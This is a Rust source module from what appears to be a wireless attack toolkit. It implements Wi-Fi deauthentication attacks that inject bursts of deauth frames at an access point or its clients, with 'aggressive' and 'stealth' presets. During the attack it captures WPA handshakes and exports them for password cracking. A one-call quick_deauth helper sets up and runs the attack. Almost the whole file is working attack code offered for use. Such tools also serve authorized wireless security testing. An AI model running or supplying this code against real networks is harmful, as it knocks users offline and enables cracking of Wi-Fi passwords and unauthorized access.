//! Deauthentication attack implementation
//!
//! This module provides high-level deauth attack functionality,
//! orchestrating monitor mode, injection, and capture.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use crate::capture::{CaptureFilter, CapturedPacket, PacketCapture};
use crate::error::{Result, WirelessError};
use crate::frames::{DeauthFrame, DeauthReason, MacAddress};
use crate::handshake::{HandshakeCapture, HandshakeExport};
use crate::inject::{InjectionStats, Injector};
use crate::interface::WirelessInterface;

/// Deauthentication attack configuration
#[derive(Debug, Clone)]
pub struct DeauthConfig {
    /// Number of deauth packets per burst
    pub packets_per_burst: u32,
    /// Total attack duration
    pub duration: Duration,
    /// Interval between bursts
    pub burst_interval: Duration,
    /// Reason code to use
    pub reason: DeauthReason,
    /// Send both directions (AP->client and client->AP)
    pub bidirectional: bool,
    /// Also send disassociation frames
    pub include_disassoc: bool,
    /// Capture handshakes during attack
    pub capture_handshake: bool,
    /// Stop when handshake is captured
    pub stop_on_handshake: bool,
}

impl Default for DeauthConfig {
    fn default() -> Self {
        Self {
            packets_per_burst: 64,
            duration: Duration::from_secs(120),
            burst_interval: Duration::from_secs(1),
            reason: DeauthReason::Class3FromNonAssoc,
            bidirectional: true,
            include_disassoc: false,
            capture_handshake: true,
            stop_on_handshake: false,
        }
    }
}

impl DeauthConfig {
    /// Quick attack config (30 seconds)
    pub fn quick() -> Self {
        Self {
            duration: Duration::from_secs(30),
            ..Default::default()
        }
    }

    /// Aggressive attack config
    pub fn aggressive() -> Self {
        Self {
            packets_per_burst: 128,
            burst_interval: Duration::from_millis(500),
            ..Default::default()
        }
    }

    /// Stealth attack config (fewer packets, longer intervals)
    pub fn stealth() -> Self {
        Self {
            packets_per_burst: 8,
            burst_interval: Duration::from_secs(5),
            ..Default::default()
        }
    }

    /// Set duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }

    /// Set packets per burst
    pub fn with_packets(mut self, packets: u32) -> Self {
        self.packets_per_burst = packets;
        self
    }
}

/// Deauthentication attack statistics
#[derive(Debug, Clone, Default)]
pub struct DeauthStats {
    /// Total packets sent
    pub packets_sent: u64,
    /// Total bursts executed
    pub bursts: u32,
    /// Packets that failed to send
    pub failed_packets: u32,
    /// Total bytes sent
    pub bytes_sent: u64,
    /// Attack duration
    pub duration: Duration,
    /// Handshake captured
    pub handshake_captured: bool,
    /// Number of EAPOL frames seen
    pub eapol_frames: u64,
}

impl DeauthStats {
    /// Packets per second rate
    pub fn packets_per_second(&self) -> f32 {
        if self.duration.as_secs_f32() == 0.0 {
            0.0
        } else {
            self.packets_sent as f32 / self.duration.as_secs_f32()
        }
    }
}

/// Deauthentication attacker
pub struct DeauthAttacker {
    interface_name: String,
    injector: Injector,
}

impl DeauthAttacker {
    /// Create new attacker for interface
    pub fn new(interface: &WirelessInterface) -> Result<Self> {
        if !interface.is_monitor_mode()? {
            return Err(WirelessError::MonitorMode(
                "Interface must be in monitor mode for deauth attack".into(),
            ));
        }

        Ok(Self {
            interface_name: interface.name().to_string(),
            injector: Injector::from_interface(interface)?,
        })
    }

    /// Create from interface name (assumes already in monitor mode)
    pub fn from_name(name: &str) -> Result<Self> {
        Ok(Self {
            interface_name: name.to_string(),
            injector: Injector::new(name)?,
        })
    }

    /// Execute deauth attack
    pub fn attack(
        &mut self,
        bssid: MacAddress,
        client: Option<MacAddress>,
        config: DeauthConfig,
    ) -> Result<DeauthStats> {
        tracing::info!(
            "Starting deauth attack on BSSID {} (client: {})",
            bssid,
            client
                .map(|c| c.to_string())
                .unwrap_or_else(|| "broadcast".to_string())
        );

        let mut stats = DeauthStats::default();
        let start = Instant::now();
        let stop_flag = Arc::new(AtomicBool::new(false));

        // Optional: Start handshake capture in background thread
        let handshake_state = if config.capture_handshake {
            Some(Arc::new(std::sync::Mutex::new(HandshakeCapture::new(
                bssid, client,
            ))))
        } else {
            None
        };

        // Main attack loop
        while start.elapsed() < config.duration && !stop_flag.load(Ordering::Relaxed) {
            // Send deauth burst
            let result = self.send_deauth_burst(bssid, client, &config)?;

            stats.packets_sent += result.sent as u64;
            stats.failed_packets += result.failed;
            stats.bytes_sent += result.bytes;
            stats.bursts += 1;

            tracing::debug!(
                "Burst {}: sent {} packets ({} failed)",
                stats.bursts,
                result.sent,
                result.failed
            );

            // Wait before next burst
            if start.elapsed() + config.burst_interval < config.duration {
                thread::sleep(config.burst_interval);
            }
        }

        stats.duration = start.elapsed();

        // Check if handshake was captured
        if let Some(ref hs) = handshake_state {
            if let Ok(guard) = hs.lock() {
                stats.handshake_captured = guard.is_complete();
            }
        }

        tracing::info!(
            "Deauth attack complete: {} packets in {} bursts over {:.1}s (handshake: {})",
            stats.packets_sent,
            stats.bursts,
            stats.duration.as_secs_f32(),
            if stats.handshake_captured {
                "captured"
            } else {
                "not captured"
            }
        );

        Ok(stats)
    }

    /// Execute attack with real-time capture
    pub fn attack_with_capture(
        &mut self,
        bssid: MacAddress,
        client: Option<MacAddress>,
        config: DeauthConfig,
    ) -> Result<(DeauthStats, Vec<CapturedPacket>, Option<HandshakeExport>)> {
        tracing::info!("Starting deauth attack with capture");

        let mut stats = DeauthStats::default();
        let mut captured_packets = Vec::new();
        let start = Instant::now();

        // Create capture socket
        let mut capture = PacketCapture::new(&self.interface_name)?;
        capture.set_filter(CaptureFilter::for_bssid(bssid).with_bssid(bssid));

        // Handshake tracker
        let mut handshake = HandshakeCapture::new(bssid, client);
        let mut handshake_export: Option<HandshakeExport> = None;

        while start.elapsed() < config.duration {
            // Send deauth burst
            let result = self.send_deauth_burst(bssid, client, &config)?;
            stats.packets_sent += result.sent as u64;
            stats.failed_packets += result.failed;
            stats.bytes_sent += result.bytes;
            stats.bursts += 1;

            // Capture packets during burst interval
            let capture_until = Instant::now() + config.burst_interval;
            while Instant::now() < capture_until {
                if let Some(packet) = capture.next_packet()? {
                    if packet.is_eapol() {
                        stats.eapol_frames += 1;
                        handshake.process_packet(&packet);
                        captured_packets.push(packet);

                        if handshake.is_complete() {
                            tracing::info!("Handshake captured!");
                            stats.handshake_captured = true;
                            if handshake_export.is_none() {
                                handshake_export = handshake.export_for_cracking();
                            }

                            if config.stop_on_handshake {
                                stats.duration = start.elapsed();
                                return Ok((stats, captured_packets, handshake_export));
                            }
                        }
                    }
                }
            }
        }

        stats.duration = start.elapsed();
        stats.handshake_captured = handshake.is_complete();

        Ok((stats, captured_packets, handshake_export))
    }

    /// Send a single deauth burst
    fn send_deauth_burst(
        &mut self,
        bssid: MacAddress,
        client: Option<MacAddress>,
        config: &DeauthConfig,
    ) -> Result<InjectionStats> {
        self.injector
            .inject_deauth_burst(bssid, client, config.reason, config.packets_per_burst)
    }

    /// Send single deauth frame
    pub fn send_deauth(
        &mut self,
        bssid: MacAddress,
        client: MacAddress,
        reason: DeauthReason,
    ) -> Result<usize> {
        let mut frame = DeauthFrame::from_ap(bssid, client, reason);
        self.injector.inject_deauth(&mut frame)
    }

    /// Broadcast deauth to all clients
    pub fn broadcast_deauth(&mut self, bssid: MacAddress, reason: DeauthReason) -> Result<usize> {
        self.send_deauth(bssid, MacAddress::BROADCAST, reason)
    }
}

/// Quick deauth function for simple use cases
pub fn quick_deauth(
    interface: &str,
    bssid: &str,
    channel: u8,
    duration_secs: u64,
) -> Result<DeauthStats> {
    // Parse BSSID
    let bssid: MacAddress = bssid
        .parse()
        .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))?;

    // Setup interface
    let mut iface = WirelessInterface::new(interface)?;
    iface.set_monitor_mode()?;
    iface.set_channel(channel)?;

    // Run attack
    let mut attacker = DeauthAttacker::new(&iface)?;
    let config = DeauthConfig::default().with_duration(Duration::from_secs(duration_secs));

    let stats = attacker.attack(bssid, None, config)?;

    // Cleanup
    iface.set_managed_mode()?;

    Ok(stats)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deauth_config() {
        let config = DeauthConfig::default();
        assert_eq!(config.packets_per_burst, 64);
        assert_eq!(config.duration, Duration::from_secs(120));

        let quick = DeauthConfig::quick();
        assert_eq!(quick.duration, Duration::from_secs(30));

        let aggressive = DeauthConfig::aggressive();
        assert_eq!(aggressive.packets_per_burst, 128);
    }

    #[test]
    fn test_deauth_stats() {
        let stats = DeauthStats {
            packets_sent: 1000,
            duration: Duration::from_secs(10),
            ..Default::default()
        };

        assert!((stats.packets_per_second() - 100.0).abs() < 0.01);
    }
}
